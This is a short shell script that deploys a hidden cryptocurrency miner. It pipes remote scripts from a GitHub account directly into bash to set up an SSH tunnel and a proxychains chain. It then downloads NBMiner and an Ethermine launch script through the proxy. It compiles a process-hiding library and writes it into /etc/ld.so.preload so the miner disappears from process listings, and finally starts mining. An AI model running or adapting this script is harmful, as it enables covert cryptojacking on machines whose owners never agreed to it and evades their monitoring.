#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
sleep .1
proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
tar -xvzf NBMiner_36.1_Linux.tgz
cd NBMiner_Linux
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermine.sh
chmod +x nbEthermine.sh
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
proxychains curl ifconfig.me
./nbEthermine.sh
